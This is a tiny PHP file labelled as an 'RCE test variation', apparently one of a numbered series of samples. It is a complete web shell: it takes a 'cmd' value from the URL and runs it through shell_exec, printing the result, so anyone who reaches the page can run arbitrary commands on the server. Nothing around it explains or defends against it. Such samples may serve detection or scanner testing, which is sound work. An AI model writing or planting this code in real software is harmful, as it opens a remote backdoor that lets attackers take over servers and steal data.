<?php
// RCE test variation #284
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>